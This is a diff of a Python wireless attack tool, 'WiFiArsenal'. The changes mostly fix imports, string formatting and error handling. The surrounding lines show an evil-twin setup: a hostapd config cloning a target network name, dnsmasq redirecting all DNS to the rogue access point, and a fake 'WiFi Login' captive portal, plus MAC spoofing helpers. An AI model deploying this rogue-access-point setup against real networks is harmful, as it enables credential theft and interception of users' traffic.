@@ -21,6 +21,7 @@ import socket
 import struct
 from datetime import datetime
 from pathlib import Path
+
 try:
     from scapy.all import *
     import psutil
@@ -31,11 +32,19 @@ except ImportError as e:
     print(f"[!] Missing required module: {e}")
     print("[*] Installing dependencies...")
     subprocess.run([sys.executable, '-m', 'pip', 'install', 'scapy', 'psutil', 'requests', 'colorama'])
-    from scapy.all import *
-    import psutil
-    import requests
-    from colorama import init, Fore, Back, Style
-    init()
+    try:
+        from scapy.all import *
+        import psutil
+        import requests
+        from colorama import init, Fore, Back, Style
+        init()
+    except ImportError:
+        print("[!] Failed to install dependencies. Some features may not work.")
+        # Fallback for missing colorama
+        class MockColor:
+            def __getattr__(self, name):
+                return ""
+        Fore = Back = Style = MockColor()
 
 class WiFiArsenal:
     def __init__(self):
@@ -111,7 +120,7 @@ class WiFiArsenal:
         if missing:
             print(f"{Fore.YELLOW}[!] Missing optional tools: {', '.join(missing)}")
             print("[*] Install with: apt-get install aircrack-ng reaver hashcat john hostapd dnsmasq")
-            print("[*] Some features may be limited{Style.RESET_ALL}")
+            print(f"[*] Some features may be limited{Style.RESET_ALL}")
             
         # Check for critical dependencies
         critical = ['iwconfig', 'iwlist']
@@ -125,9 +134,12 @@ class WiFiArsenal:
         
     def command_exists(self, command):
         """Check if command exists"""
-        return subprocess.call(['which', command], 
-                             stdout=subprocess.DEVNULL, 
-                             stderr=subprocess.DEVNULL) == 0
+        try:
+            return subprocess.call(['which', command], 
+                                 stdout=subprocess.DEVNULL, 
+                                 stderr=subprocess.DEVNULL) == 0
+        except:
+            return False
                              
     def get_interfaces(self):
         """Get available network interfaces with enhanced detection"""
@@ -556,8 +568,7 @@ class WiFiArsenal:
         dnsmasq_conf = f"{self.results_dir}/evil_twin/dnsmasq.conf"
         
         # Hostapd configuration
-        hostapd_content = f"""
-interface={self.monitor_interface}
+        hostapd_content = f"""interface={self.monitor_interface}
 driver=nl80211
 ssid={target_essid}
 hw_mode=g
@@ -573,8 +584,7 @@ rsn_pairwise=CCMP
 """
         
         # Dnsmasq configuration
-        dnsmasq_content = f"""
-interface={self.monitor_interface}
+        dnsmasq_content = f"""interface={self.monitor_interface}
 dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
 dhcp-option=3,192.168.1.1
 dhcp-option=6,192.168.1.1
@@ -596,8 +606,7 @@ address=/#/192.168.1.1
         portal_dir = f"{self.results_dir}/evil_twin/portal"
         os.makedirs(portal_dir, exist_ok=True)
         
-        portal_html = """
-<!DOCTYPE html>
+        portal_html = """<!DOCTYPE html>
 <html>
 <head>
     <title>WiFi Login</title>
@@ -618,8 +627,7 @@ address=/#/192.168.1.1
         </form>
     </div>
 </body>
-</html>
-"""
+</html>"""
         
         with open(f"{portal_dir}/index.html", 'w') as f:
             f.write(portal_html)
@@ -1085,8 +1093,7 @@ address=/#/192.168.1.1
         
     def generate_html_report(self, report_data):
         """Generate HTML report"""
-        html_template = f"""
-<!DOCTYPE html>
+        html_template = f"""<!DOCTYPE html>
 <html>
 <head>
     <title>WiFi Arsenal Report</title>
@@ -1127,8 +1134,7 @@ address=/#/192.168.1.1
             <th>Security</th>
             <th>Signal</th>
             <th>Risk Level</th>
-        </tr>
-"""
+        </tr>"""
         
         for network in report_data['networks']:
             security_analysis = network.get('security_analysis', {})
@@ -1148,15 +1154,13 @@ address=/#/192.168.1.1
             <td>{network.get('privacy', 'Unknown')}</td>
             <td>{network.get('power', 'Unknown')} dBm</td>
             <td>{strength}</td>
-        </tr>
-"""
+        </tr>"""
         
         html_template += """
     </table>
     
     <h2>Recommendations</h2>
-    <ul>
-"""
+    <ul>"""
         
         for rec in report_data['recommendations']:
             html_template += f"        <li>{rec}</li>\n"
@@ -1164,8 +1168,7 @@ address=/#/192.168.1.1
         html_template += """
     </ul>
 </body>
-</html>
-"""
+</html>"""
         
         return html_template
         
@@ -1544,7 +1547,6 @@ address=/#/192.168.1.1
             
     def validate_mac(self, mac):
         """Validate MAC address format"""
-        import re
         return re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac) is not None
         
     def mac_change_specific(self, interface, mac):
@@ -1946,7 +1948,7 @@ address=/#/192.168.1.1
         # Check if running as root
         if os.geteuid() != 0:
             print(f"{Fore.RED}[!] This tool requires root privileges")
-            print(f"[*] Please run with: sudo python3 main.py{Style.RESET_ALL}")
+            print(f"[*] Please run with: sudo python3 wifi_arsenal.py{Style.RESET_ALL}")
             sys.exit(1)
             
         # Check dependencies
